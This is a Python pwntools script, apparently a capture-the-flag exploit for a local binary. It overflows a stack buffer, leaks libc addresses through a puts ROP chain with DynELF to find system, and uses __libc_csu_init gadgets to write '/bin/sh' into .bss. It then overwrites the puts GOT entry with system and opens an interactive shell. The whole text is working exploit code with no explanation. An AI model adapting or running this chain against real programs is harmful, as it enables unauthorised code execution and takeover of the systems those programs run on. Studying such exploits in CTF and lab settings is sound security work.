from pwn import *
context.log_level = 'info'
context.arch = 'amd64'

cn = process('./bin')
bin = ELF('./bin')

stuff = 'a'*0x30 + 'b'*8

def leak(address):
	pay = ROP(bin)
	pay.puts(address)
	pay.main()
	cn.sendline(stuff + str(pay))
	data = cn.recvuntil('\x0a*****')[:-6]
	cn.recv()
	if data == '':
		return '\0'
	return data

def csu_init_rop(addr,argv):
    rop = ""
    rop += 'a'*8            #padding
    rop += p64(0)           #rbx
    rop += p64(1)           #rbp (make rbx+1 == rbp)
    rop += p64(addr)        #r12 (call address)
    rop += p64(argv[2])     #r13 (rdx argv3)
    rop += p64(argv[1])     #r14 (rsi argv2)
    rop += p64(argv[0])     #r15 (rdi argv1)
    rop += p64(0x400750)    #magic address
    return rop
	
cn.recv()

d = DynELF(leak,elf = bin)
p_system = d.lookup('system','libc')# get p_system
log.success("p_system => " + hex(p_system))

pay = stuff + p64(0x400766)
pay += csu_init_rop(bin.got['read'],[0,0x60100C,9])#write pointer of main
pay += csu_init_rop(0x60100C,[0,0,0])
cn.sendline(pay)
cn.sendline(p64(0x4006D1))
print cn.recv()
log.success("write pointer of main to 0x60100c")
raw_input()
pay = stuff + p64(0x400766)
pay += csu_init_rop(bin.got['read'],[0,bin.bss(),9])#wirte /bin/sh to bss
pay += csu_init_rop(0x60100C,[0,0,0])
cn.sendline(pay)
cn.sendline('/bin/sh\0')
cn.recv()#zha le

pay = stuff + p64(0x400766)
pay += csu_init_rop(bin.got['read'],[0,bin.got['puts'],9])#write p_system to got.puts
pay += csu_init_rop(0x60100C,[0,0,0])
cn.sendline(pay)
cn.sendline(p64(p_system))
cn.recv()

pay = stuff + p64(0x400766)
pay += csu_init_rop(bin.got['puts'],[bin.bss(),0,0])#get shell using system(fake puts)
cn.sendline(pay)


cn.interactive()


